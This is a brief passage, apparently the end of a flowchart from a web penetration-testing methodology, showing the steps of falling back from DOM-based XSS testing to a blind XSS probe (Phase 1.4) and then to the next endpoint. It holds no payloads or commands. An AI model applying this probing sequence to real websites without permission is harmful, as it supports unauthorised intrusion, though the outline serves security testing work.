                   → No DOM XSS? → Blind XSS probe (Phase 1.4)
                   → No Blind?  → Move to next endpoint
```
